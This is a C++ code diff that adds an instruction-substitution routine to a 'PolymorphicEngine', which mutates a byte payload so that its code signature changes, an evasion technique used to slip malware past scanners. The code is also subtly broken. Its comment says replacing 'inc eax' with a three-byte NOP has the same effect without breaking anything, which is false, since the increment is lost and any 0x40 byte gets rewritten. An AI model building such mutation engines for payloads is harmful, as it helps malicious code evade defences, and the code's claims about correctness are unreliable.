@@ -20,8 +20,28 @@ namespace AetherVisor {
             }
 
             // Chain multiple mutation techniques for a more complex result.
+            SubstituteInstructions(payload);
             AppendNopSled(payload);
             AddJunkInstructions(payload);
+        }
+
+        void PolymorphicEngine::SubstituteInstructions(std::vector<unsigned char>& payload) {
+            // This is a naive implementation for demonstration. A real one would need
+            // a full disassembler engine to safely replace instructions without
+            // corrupting relative offsets.
+            for (size_t i = 0; i < payload.size(); ++i) {
+                // Look for 'inc eax' (opcode 0x40)
+                if (payload[i] == 0x40) {
+                    // Replace with 'add eax, 1' (0x83 0xC0 0x01). This changes the length.
+                    // To avoid corruption in this simplified demo, we will replace it
+                    // with a 3-byte NOP (0x0F 0x1F 0x00) which has the same effect
+                    // of changing the code signature and length without breaking things.
+                    payload[i] = 0x0F;
+                    payload.insert(payload.begin() + i + 1, {0x1F, 0x00});
+                    // Advance past the newly inserted bytes
+                    i += 2;
+                }
+            }
         }
 
         void PolymorphicEngine::AddJunkInstructions(std::vector<unsigned char>& payload) {
